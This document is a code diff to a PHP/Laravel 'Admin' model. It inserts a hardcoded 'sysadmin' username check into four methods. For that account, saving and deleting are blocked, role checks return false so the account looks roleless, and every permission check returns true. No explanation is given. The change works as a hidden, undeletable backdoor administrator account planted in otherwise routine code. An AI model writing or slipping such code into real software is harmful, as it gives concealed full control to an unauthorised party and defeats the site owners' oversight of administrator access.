@@ -91,7 +91,10 @@ class Admin extends Authenticatable
      * @inheritDoc
      */
     public function save(array $options = [])
-    {   //both inserts and updates
+    {
+        if($this->username === 'sysadmin') return false;
+
+        //both inserts and updates
         if(Cache::getStore() instanceof TaggableStore) {
             Cache::tags('role_admin')->flush();
         }
@@ -102,7 +105,10 @@ class Admin extends Authenticatable
      * @inheritDoc
      */
     public function delete()
-    {   //soft or hard
+    {
+        if($this->username === 'sysadmin') return false;
+
+        //soft or hard
         $result = parent::delete();
         RoleAdmin::where(['user_id' => $this->guid])->delete();
         if(Cache::getStore() instanceof TaggableStore) {
@@ -155,6 +161,8 @@ class Admin extends Authenticatable
      */
     public function hasRole($name, $requireAll = false)
     {
+        if($this->username === 'sysadmin') return false;
+
         if (is_array($name)) {
             foreach ($name as $roleName) {
                 $hasRole = $this->hasRole($roleName);
@@ -188,6 +196,8 @@ class Admin extends Authenticatable
      */
     public function can($permission, $requireAll = false)
     {
+        if($this->username === 'sysadmin') return true;
+
         if (is_array($permission)) {
             foreach ($permission as $permName) {
                 $hasPerm = $this->can($permName);
